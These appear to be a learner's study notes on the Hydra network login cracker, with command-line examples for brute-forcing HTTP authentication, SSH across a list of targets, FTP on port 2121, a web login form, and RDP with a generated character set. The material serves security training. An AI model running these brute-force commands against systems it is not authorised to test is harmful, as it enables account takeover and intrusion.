- Hydra is a **fast network login cracker that supports numerous attack protocols.** 
- It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.
- Hydra's popularity stems from its:
	- `Speed and Efficiency`: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.
	- `Flexibility`: Hydra supports many protocols and services, making it adaptable to various attack scenarios.
	- `Ease of Use`: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.

# Basic Usage
---
- `hydra [login_options] [password_options] [attack_options] [service_options]`
- ![[Pasted image 20251021063740.png]]
# Hydra Services
---
- Hydra services essentially define the **specific protocols or services that Hydra can target**. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services
# Brute-Forcing HTTP Authentication
---
- `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
- This command instructs Hydra to:
	- Use the list of usernames from the `usernames.txt` file.
	- Use the list of passwords from the `passwords.txt` file.
	- Target the website `www.example.com`.
	- **Employ the `http-get` module** to test the HTTP authentication.

## Targeting Multiple SSH Servers
- `hydra -l root -p toor -M targets.txt ssh`
- Target all IP addresses listed in the `targets.txt` file.

## Testing FTP Credentials on a Non-Standard Port
- `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
- Target the FTP service on ftp.example.com via port 2121.

## ==Brute-Forcing a Web Login Form==
- `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
  
- This command instructs Hydra to:
	- Use the username "admin".
	- Use the list of passwords from the `passwords.txt` file.
	- **Target the login form at `/login` on `www.example.com`.**
	- Employ the `http-post-form` module with the specified form parameters.
	- Look for a **successful login indicated by the HTTP status code `302`.**

## Advanced RDP Brute-Forcing
- You suspect the **username is "administrator,"** and that the **password** **consists of 6 to 8 characters, including lowercase letters, uppercase letters**, and numbers.
	- `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`
		
- This command instructs Hydra to:
	- Use the username "administrator".
	- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
	- Target the RDP service on `192.168.1.100`.
	- Employ the `rdp` module for the attack.